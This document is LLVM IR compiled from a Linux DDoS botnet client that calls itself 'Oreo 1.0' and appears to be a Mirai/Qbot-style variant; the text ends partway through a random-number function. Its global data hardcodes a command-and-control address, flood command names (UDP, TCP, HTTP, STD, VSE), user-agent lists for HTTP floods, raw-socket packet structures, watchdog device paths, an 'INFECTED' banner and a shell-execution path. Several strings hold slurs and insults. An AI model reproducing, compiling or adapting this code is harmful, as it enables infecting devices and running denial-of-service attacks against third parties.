; ModuleID = 'host/ir_O0/Oreo.ll'
source_filename = "llvm-link"
target datalayout = "e-m:e-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.in_addr = type { i32 }
%struct.__va_list_tag = type { i32, i32, i8*, i8* }
%struct.__sigset_t = type { [16 x i64] }
%struct.sockaddr_in = type { i16, i16, %struct.in_addr, [8 x i8] }
%struct.timeval = type { i64, i64 }
%struct.sockaddr = type { i16, [14 x i8] }
%struct.hostent = type { i8*, i8**, i32, i32, i8** }
%struct.iphdr = type { i8, i8, i16, i16, i16, i8, i8, i16, i32, i32 }
%struct.tcphdr = type { %union.anon.0 }
%union.anon.0 = type { %struct.anon }
%struct.anon = type { i16, i16, i32, i32, i8, i8, i16, i16, i16 }
%struct.tcp_pseudo = type { i64, i64, i8, i8, i16 }
%struct.udphdr = type { %union.anon.2 }
%union.anon.2 = type { %struct.anon.3 }
%struct.anon.3 = type { i16, i16, i16, i16 }
%struct.anon.1 = type { i16, i16, i32, i32, i16, i16, i16, i16 }
%struct.ifreq = type { %union.anon.5, %union.anon.6 }
%union.anon.5 = type { [16 x i8] }
%union.anon.6 = type { %struct.ifmap }
%struct.ifmap = type { i64, i64, i16, i8, i8, i8 }

@OreoServer = global [1 x i8*] [i8* getelementptr inbounds ([18 x i8], [18 x i8]* @.str, i32 0, i32 0)], align 8
@.str = private unnamed_addr constant [18 x i8] c"128.199.197.79:23\00", align 1
@ioctl_pid = global i32 0, align 4
@mainCommSock = global i32 0, align 4
@currentServer = global i32 -1, align 4
@gotIP = global i32 0, align 4
@rangechoice = global i32 1, align 4
@numpids = global i64 0, align 8
@macAddress = global [6 x i8] zeroinitializer, align 1
@pids = common global i32* null, align 8
@ourIP = common global %struct.in_addr zeroinitializer, align 4
@useragents = global [32 x i8*] [i8* getelementptr inbounds ([115 x i8], [115 x i8]* @.str.42, i32 0, i32 0), i8* getelementptr inbounds ([116 x i8], [116 x i8]* @.str.43, i32 0, i32 0), i8* getelementptr inbounds ([116 x i8], [116 x i8]* @.str.44, i32 0, i32 0), i8* getelementptr inbounds ([136 x i8], [136 x i8]* @.str.45, i32 0, i32 0), i8* getelementptr inbounds ([73 x i8], [73 x i8]* @.str.46, i32 0, i32 0), i8* getelementptr inbounds ([115 x i8], [115 x i8]* @.str.47, i32 0, i32 0), i8* getelementptr inbounds ([165 x i8], [165 x i8]* @.str.48, i32 0, i32 0), i8* getelementptr inbounds ([116 x i8], [116 x i8]* @.str.49, i32 0, i32 0), i8* getelementptr inbounds ([164 x i8], [164 x i8]* @.str.50, i32 0, i32 0), i8* getelementptr inbounds ([152 x i8], [152 x i8]* @.str.51, i32 0, i32 0), i8* getelementptr inbounds ([110 x i8], [110 x i8]* @.str.52, i32 0, i32 0), i8* getelementptr inbounds ([115 x i8], [115 x i8]* @.str.53, i32 0, i32 0), i8* getelementptr inbounds ([157 x i8], [157 x i8]* @.str.54, i32 0, i32 0), i8* getelementptr inbounds ([115 x i8], [115 x i8]* @.str.55, i32 0, i32 0), i8* getelementptr inbounds ([115 x i8], [115 x i8]* @.str.56, i32 0, i32 0), i8* getelementptr inbounds ([157 x i8], [157 x i8]* @.str.57, i32 0, i32 0), i8* getelementptr inbounds ([82 x i8], [82 x i8]* @.str.58, i32 0, i32 0), i8* getelementptr inbounds ([115 x i8], [115 x i8]* @.str.59, i32 0, i32 0), i8* getelementptr inbounds ([63 x i8], [63 x i8]* @.str.60, i32 0, i32 0), i8* getelementptr inbounds ([182 x i8], [182 x i8]* @.str.61, i32 0, i32 0), i8* getelementptr inbounds ([83 x i8], [83 x i8]* @.str.62, i32 0, i32 0), i8* getelementptr inbounds ([88 x i8], [88 x i8]* @.str.63, i32 0, i32 0), i8* getelementptr inbounds ([88 x i8], [88 x i8]* @.str.64, i32 0, i32 0), i8* getelementptr inbounds ([64 x i8], [64 x i8]* @.str.65, i32 0, i32 0), i8* getelementptr inbounds ([69 x i8], [69 x i8]* @.str.66, i32 0, i32 0), i8* getelementptr inbounds ([88 x i8], [88 x i8]* @.str.67, i32 0, i32 0), i8* getelementptr inbounds ([106 x i8], [106 x i8]* @.str.68, i32 0, i32 0), i8* getelementptr inbounds ([87 x i8], [87 x i8]* @.str.69, i32 0, i32 0), i8* getelementptr inbounds ([80 x i8], [80 x i8]* @.str.70, i32 0, i32 0), i8* getelementptr inbounds ([34 x i8], [34 x i8]* @.str.71, i32 0, i32 0), i8* getelementptr inbounds ([91 x i8], [91 x i8]* @.str.72, i32 0, i32 0), i8* getelementptr inbounds ([64 x i8], [64 x i8]* @.str.73, i32 0, i32 0)], align 16
@.str.42 = private unnamed_addr constant [115 x i8] c"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.86 Safari/537.36\00", align 1
@.str.43 = private unnamed_addr constant [116 x i8] c"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.100 Safari/537.36\00", align 1
@.str.44 = private unnamed_addr constant [116 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13) AppleWebKit/604.1.38 (KHTML, like Gecko) Version/11.0 Safari/604.1.38\00", align 1
@.str.45 = private unnamed_addr constant [136 x i8] c"Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53\00", align 1
@.str.46 = private unnamed_addr constant [73 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0\00", align 1
@.str.47 = private unnamed_addr constant [115 x i8] c"Mozilla/5.0 (X11; CrOS x86_64 9592.96.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.114 Safari/537.36\00", align 1
@.str.48 = private unnamed_addr constant [165 x i8] c"Mozilla/5.0 (Linux; Android 7.0; SAMSUNG SM-G930W8 Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/5.4 Chrome/51.0.2704.106 Mobile Safari/537.36\00", align 1
@.str.49 = private unnamed_addr constant [116 x i8] c"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36\00", align 1
@.str.50 = private unnamed_addr constant [164 x i8] c"Mozilla/5.0 (Windows Phone 10.0; Android 6.0.1; Microsoft; Lumia 535) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Mobile Safari/537.36 Edge/14.14393\00", align 1
@.str.51 = private unnamed_addr constant [152 x i8] c"Mozilla/5.0 (Linux; Android 4.4.4; HTC Desire 620 Build/KTU84P) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/33.0.0.0 Mobile Safari/537.36\00", align 1
@.str.52 = private unnamed_addr constant [110 x i8] c"Mozilla/5.0 (iPhone; CPU iPhone OS 10_2_1 like Mac OS X) AppleWebKit/602.4.6 (KHTML, like Gecko) Mobile/14D27\00", align 1
@.str.53 = private unnamed_addr constant [115 x i8] c"Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36\00", align 1
@.str.54 = private unnamed_addr constant [157 x i8] c"Mozilla/5.0 (Linux; Android 5.0; HUAWEI GRA-L09 Build/HUAWEIGRA-L09) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/37.0.0.0 Mobile Safari/537.36\00", align 1
@.str.55 = private unnamed_addr constant [115 x i8] c"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36\00", align 1
@.str.56 = private unnamed_addr constant [115 x i8] c"Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.100 Safari/537.36\00", align 1
@.str.57 = private unnamed_addr constant [157 x i8] c"Mozilla/5.0(iPad; U; CPU iPhone OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B314 Safari/531.21.10gin_lib.cc\00", align 1
@.str.58 = private unnamed_addr constant [82 x i8] c"Mozilla/5.0 Galeon/1.2.9 (X11; Linux i686; U;) Gecko/20021213 Debian/1.2.9-0.bunk\00", align 1
@.str.59 = private unnamed_addr constant [115 x i8] c"Mozilla/5.0 Slackware/13.37 (X11; U; Linux x86_64; en-US) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.41\00", align 1
@.str.60 = private unnamed_addr constant [63 x i8] c"Mozilla/5.0 (compatible; iCab 3.0.3; Macintosh; U; PPC Mac OS)\00", align 1
@.str.61 = private unnamed_addr constant [182 x i8] c"Opera/9.80 (J2ME/MIDP; Opera Mini/5.0 (Windows; U; Windows NT 5.1; en) AppleWebKit/886; U; en) Presto/2.4.15Mozilla/5.0 (Windows NT 10.0; WOW64; rv:48.0) Gecko/20100101 Firefox/48.0\00", align 1
@.str.62 = private unnamed_addr constant [83 x i8] c"Mozilla/5.0 (X11; U; Linux ppc; en-US; rv:1.9a8) Gecko/2007100620 GranParadiso/3.1\00", align 1
@.str.63 = private unnamed_addr constant [88 x i8] c"Mozilla/5.0 (compatible; U; ABrowse 0.6; Syllable) AppleWebKit/420+ (KHTML, like Gecko)\00", align 1
@.str.64 = private unnamed_addr constant [88 x i8] c"Mozilla/5.0 (Macintosh; U; Intel Mac OS X; en; rv:1.8.1.11) Gecko/20071128 Camino/1.5.4\00", align 1
@.str.65 = private unnamed_addr constant [64 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 6.1; rv:2.2) Gecko/20110201\00", align 1
@.str.66 = private unnamed_addr constant [69 x i8] c"Mozilla/5.0 (X11; U; Linux i686; pl-PL; rv:1.9.0.6) Gecko/2009020911\00", align 1
@.str.67 = private unnamed_addr constant [88 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 6.1; cs; rv:1.9.2.6) Gecko/20100628 myibrow/4alpha2\00", align 1
@.str.68 = private unnamed_addr constant [106 x i8] c"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; MyIE2; SLCC1; .NET CLR 2.0.50727; Media Center PC 5.0)\00", align 1
@.str.69 = private unnamed_addr constant [87 x i8] c"Mozilla/5.0 (Windows; U; Win 9x 4.90; SG; rv:1.9.2.4) Gecko/20101104 Netscape/9.1.0285\00", align 1
@.str.70 = private unnamed_addr constant [80 x i8] c"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.8) Gecko/20090327 Galeon/2.0.7\00", align 1
@.str.71 = private unnamed_addr constant [34 x i8] c"Mozilla/5.0 (PLAYSTATION 3; 3.55)\00", align 1
@.str.72 = private unnamed_addr constant [91 x i8] c"Mozilla/5.0 (X11; Linux x86_64; rv:38.0) Gecko/20100101 Thunderbird/38.2.0 Lightning/4.0.2\00", align 1
@.str.73 = private unnamed_addr constant [64 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64) SkypeUriPreview Preview/0.5\00", align 1
@scanPid = common global i32 0, align 4
@ourPublicIP = common global %struct.in_addr zeroinitializer, align 4
@Q = internal global [4096 x i32] zeroinitializer, align 16
@rand_cmwc.i = internal global i32 4095, align 4
@c = internal global i32 362436, align 4
@.str.117 = private unnamed_addr constant [7 x i8] c"(null)\00", align 1
@fdopen_pids = internal global i32* null, align 8
@.str.1 = private unnamed_addr constant [8 x i8] c"/bin/sh\00", align 1
@.str.2 = private unnamed_addr constant [3 x i8] c"sh\00", align 1
@.str.3 = private unnamed_addr constant [3 x i8] c"-c\00", align 1
@hextable = internal constant [256 x i64] [i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 0, i64 1, i64 2, i64 3, i64 4, i64 5, i64 6, i64 7, i64 8, i64 9, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 10, i64 11, i64 12, i64 13, i64 14, i64 15, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 10, i64 11, i64 12, i64 13, i64 14, i64 15, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1], align 16
@.str.4 = private unnamed_addr constant [5 x i8] c"PING\00", align 1
@.str.5 = private unnamed_addr constant [21 x i8] c"TSource Engine Query\00", align 1
@sendSTD.randstrings = private unnamed_addr constant [36 x i8*] [i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.6, i32 0, i32 0), i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.7, i32 0, i32 0), i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.8, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.9, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.10, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.11, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.12, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.13, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.14, i32 0, i32 0), i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.15, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.16, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.17, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.18, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.19, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.20, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.21, i32 0, i32 0), i8* getelementptr inbounds ([19 x i8], [19 x i8]* @.str.22, i32 0, i32 0), i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.23, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.24, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.25, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.26, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.27, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.28, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.29, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.30, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.31, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.32, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.33, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.34, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.35, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.36, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.37, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.38, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.39, i32 0, i32 0), i8* getelementptr inbounds ([20 x i8], [20 x i8]* @.str.40, i32 0, i32 0), i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.41, i32 0, i32 0)], align 16
@.str.6 = private unnamed_addr constant [16 x i8] c"VSzNC0CJti3ouku\00", align 1
@.str.7 = private unnamed_addr constant [16 x i8] c"yhJyMAqx7DZa0kg\00", align 1
@.str.8 = private unnamed_addr constant [16 x i8] c"1Cp9MEDMN6B5L1K\00", align 1
@.str.9 = private unnamed_addr constant [11 x i8] c"miraiMIRAI\00", align 1
@.str.10 = private unnamed_addr constant [10 x i8] c"stdflood4\00", align 1
@.str.11 = private unnamed_addr constant [11 x i8] c"7XLPHoxkvL\00", align 1
@.str.12 = private unnamed_addr constant [11 x i8] c"jmQvYBdRZA\00", align 1
@.str.13 = private unnamed_addr constant [11 x i8] c"eNxERkyrfR\00", align 1
@.str.14 = private unnamed_addr constant [11 x i8] c"qHjTXcMbzH\00", align 1
@.str.15 = private unnamed_addr constant [15 x i8] c"chickennuggets\00", align 1
@.str.16 = private unnamed_addr constant [13 x i8] c"ilovecocaine\00", align 1
@.str.17 = private unnamed_addr constant [7 x i8] c"666666\00", align 1
@.str.18 = private unnamed_addr constant [9 x i8] c"88888888\00", align 1
@.str.19 = private unnamed_addr constant [11 x i8] c"0nnf0l20im\00", align 1
@.str.20 = private unnamed_addr constant [11 x i8] c"uq7ajzgm0a\00", align 1
@.str.21 = private unnamed_addr constant [5 x i8] c"loic\00", align 1
@.str.22 = private unnamed_addr constant [19 x i8] c"ParasJhaIsADumbFag\00", align 1
@.str.23 = private unnamed_addr constant [17 x i8] c"stdudpbasedflood\00", align 1
@.str.24 = private unnamed_addr constant [9 x i8] c"bitcoin1\00", align 1
@.str.25 = private unnamed_addr constant [9 x i8] c"password\00", align 1
@.str.26 = private unnamed_addr constant [10 x i8] c"encrypted\00", align 1
@.str.27 = private unnamed_addr constant [11 x i8] c"suckmydick\00", align 1
@.str.28 = private unnamed_addr constant [13 x i8] c"guardiacivil\00", align 1
@.str.29 = private unnamed_addr constant [13 x i8] c"2xoJTsbXunuj\00", align 1
@.str.30 = private unnamed_addr constant [13 x i8] c"QiMH8CGJyOj9\00", align 1
@.str.31 = private unnamed_addr constant [9 x i8] c"abcd1234\00", align 1
@.str.32 = private unnamed_addr constant [13 x i8] c"GLEQWXHAJPWM\00", align 1
@.str.33 = private unnamed_addr constant [10 x i8] c"ABCDEFGHI\00", align 1
@.str.34 = private unnamed_addr constant [10 x i8] c"abcdefghi\00", align 1
@.str.35 = private unnamed_addr constant [11 x i8] c"qbotbotnet\00", align 1
@.str.36 = private unnamed_addr constant [12 x i8] c"lizardsquad\00", align 1
@.str.37 = private unnamed_addr constant [10 x i8] c"aNrjBnTRi\00", align 1
@.str.38 = private unnamed_addr constant [10 x i8] c"1QD8ypG86\00", align 1
@.str.39 = private unnamed_addr constant [10 x i8] c"IVkLWYjLe\00", align 1
@.str.40 = private unnamed_addr constant [20 x i8] c"nexuszetaisamaddict\00", align 1
@.str.41 = private unnamed_addr constant [15 x i8] c"satoriskidsnet\00", align 1
@sendHTTP.methods = private unnamed_addr constant [3 x i8*] [i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.74, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.75, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.76, i32 0, i32 0)], align 16
@sendHTTP.connections = private unnamed_addr constant [3 x i8*] [i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.77, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.78, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.79, i32 0, i32 0)], align 16
@.str.80 = private unnamed_addr constant [1 x i8] zeroinitializer, align 1
@.str.81 = private unnamed_addr constant [20 x i8] c" / HTTP/1.1\0D\0AHost: \00", align 1
@.str.82 = private unnamed_addr constant [15 x i8] c"\0D\0AUser-Agent: \00", align 1
@.str.83 = private unnamed_addr constant [15 x i8] c"\0D\0AConnection: \00", align 1
@.str.84 = private unnamed_addr constant [5 x i8] c"\0D\0A\0D\0A\00", align 1
@.str.77 = private unnamed_addr constant [6 x i8] c"close\00", align 1
@.str.78 = private unnamed_addr constant [11 x i8] c"keep-alive\00", align 1
@.str.79 = private unnamed_addr constant [7 x i8] c"accept\00", align 1
@.str.74 = private unnamed_addr constant [4 x i8] c"GET\00", align 1
@.str.75 = private unnamed_addr constant [5 x i8] c"HEAD\00", align 1
@.str.76 = private unnamed_addr constant [5 x i8] c"POST\00", align 1
@.str.85 = private unnamed_addr constant [265 x i8] c"\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\00", align 1
@.str.86 = private unnamed_addr constant [64 x i8] c"%s %s HTTP/1.1\0D\0AHost: %s\0D\0AUser-Agent: %s\0D\0AConnection: close\0D\0A\0D\0A\00", align 1
@.str.87 = private unnamed_addr constant [27 x i8] c"Failed opening raw socket.\00", align 1
@.str.88 = private unnamed_addr constant [33 x i8] c"Failed setting raw headers mode.\00", align 1
@.str.89 = private unnamed_addr constant [4 x i8] c"ALL\00", align 1
@.str.90 = private unnamed_addr constant [2 x i8] c"-\00", align 1
@.str.91 = private unnamed_addr constant [4 x i8] c"SYN\00", align 1
@.str.92 = private unnamed_addr constant [4 x i8] c"RST\00", align 1
@.str.93 = private unnamed_addr constant [4 x i8] c"FIN\00", align 1
@.str.94 = private unnamed_addr constant [4 x i8] c"ACK\00", align 1
@.str.95 = private unnamed_addr constant [4 x i8] c"PSH\00", align 1
@.str.96 = private unnamed_addr constant [18 x i8] c"Invalid flag \22%s\22\00", align 1
@.str.97 = private unnamed_addr constant [2 x i8] c",\00", align 1
@.str.98 = private unnamed_addr constant [14 x i8] c"/dev/watchdog\00", align 1
@.str.99 = private unnamed_addr constant [19 x i8] c"/dev/misc/watchdog\00", align 1
@.str.100 = private unnamed_addr constant [23 x i8] c"/dev/FTWDT101_watchdog\00", align 1
@.str.101 = private unnamed_addr constant [4 x i8] c"UDP\00", align 1
@.str.102 = private unnamed_addr constant [4 x i8] c"TCP\00", align 1
@.str.103 = private unnamed_addr constant [5 x i8] c"HTTP\00", align 1
@.str.104 = private unnamed_addr constant [8 x i8] c"HTTPHEX\00", align 1
@.str.105 = private unnamed_addr constant [4 x i8] c"STD\00", align 1
@.str.106 = private unnamed_addr constant [5 x i8] c"FLUX\00", align 1
@.str.107 = private unnamed_addr constant [4 x i8] c"VSE\00", align 1
@.str.108 = private unnamed_addr constant [5 x i8] c"STOP\00", align 1
@.str.109 = private unnamed_addr constant [8 x i8] c"8.8.8.8\00", align 1
@.str.110 = private unnamed_addr constant [16 x i8] c"/proc/net/route\00", align 1
@.str.111 = private unnamed_addr constant [11 x i8] c"\0900000000\09\00", align 1
@.str.112 = private unnamed_addr constant [2 x i8] c"/\00", align 1
@.str.113 = private unnamed_addr constant [85 x i8] c"\1B[0;31m\1B[43mINFECTED\1B[40m\1B[0m \1B[0;31m----\1B[0;33m>    \1B[0;31m[\1B[0;33m%s\1B[0;31m]  \1B[0m\00", align 1
@.str.114 = private unnamed_addr constant [9 x i8] c"Oreo 1.0\00", align 1
@.str.115 = private unnamed_addr constant [4 x i8] c"DUP\00", align 1
@.str.116 = private unnamed_addr constant [2 x i8] c" \00", align 1

; Function Attrs: noinline nounwind uwtable
define void @init_rand(i32) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  store i32 %0, i32* %2, align 4
  %4 = load i32, i32* %2, align 4
  store i32 %4, i32* getelementptr inbounds ([4096 x i32], [4096 x i32]* @Q, i64 0, i64 0), align 16
  %5 = load i32, i32* %2, align 4
  %6 = add i32 %5, -1640531527
  store i32 %6, i32* getelementptr inbounds ([4096 x i32], [4096 x i32]* @Q, i64 0, i64 1), align 4
  %7 = load i32, i32* %2, align 4
  %8 = add i32 %7, -1640531527
  %9 = add i32 %8, -1640531527
  store i32 %9, i32* getelementptr inbounds ([4096 x i32], [4096 x i32]* @Q, i64 0, i64 2), align 8
  store i32 3, i32* %3, align 4
  br label %10

; <label>:10:                                     ; preds = %31, %1
  %11 = load i32, i32* %3, align 4
  %12 = icmp slt i32 %11, 4096
  br i1 %12, label %13, label %34

; <label>:13:                                     ; preds = %10
  %14 = load i32, i32* %3, align 4
  %15 = sub nsw i32 %14, 3
  %16 = sext i32 %15 to i64
  %17 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %16
  %18 = load i32, i32* %17, align 4
  %19 = load i32, i32* %3, align 4
  %20 = sub nsw i32 %19, 2
  %21 = sext i32 %20 to i64
  %22 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %21
  %23 = load i32, i32* %22, align 4
  %24 = xor i32 %18, %23
  %25 = xor i32 %24, -1640531527
  %26 = load i32, i32* %3, align 4
  %27 = xor i32 %25, %26
  %28 = load i32, i32* %3, align 4
  %29 = sext i32 %28 to i64
  %30 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %29
  store i32 %27, i32* %30, align 4
  br label %31

; <label>:31:                                     ; preds = %13
  %32 = load i32, i32* %3, align 4
  %33 = add nsw i32 %32, 1
  store i32 %33, i32* %3, align 4
  br label %10

; <label>:34:                                     ; preds = %10
  ret void
}

; Function Attrs: noinline nounwind uwtable
define i32 @rand_cmwc() #0 {
  %1 = alloca i64, align 8
  %2 = alloca i64, align 8
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  store i64 18782, i64* %2, align 8
  store i32 -2, i32* %4, align 4
  %5 = load i32, i32* @rand_cmwc.i, align 4
  %6 = add i32 %5, 1
  %7 = and i32 %6, 4095
  store i32 %7, i32* @rand_cmwc.i, align 4
  %8 = load i64, i64* %2, align 8
  %9 = load i32, i32* @rand_cmwc.i, align 4
  %10 = zext i32 %9 to i64
  %11 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %10
  %12 = load i32, i32* %11, align 4
  %13 = zext i32 %12 to i64
  %14 = mul i64 %8, %13
  %15 = load i32, i32* @c, align 4
  %16 = zext i32 %15 to i64
  %17 = add i64 %14, %16
  store i64 %17, i64* %1, align 8
  %18 = load i64, i64* %1, align 8
  %19 = lshr i64 %18, 32
  %20 = trunc i64 %19 to i32
  store i32 %20, i32* @c, align 4
  %21 = load i64, i64* %1, align 8
  %22 = load i32, i32* @c, align 4
  %23 = zext i32 %22 to i64
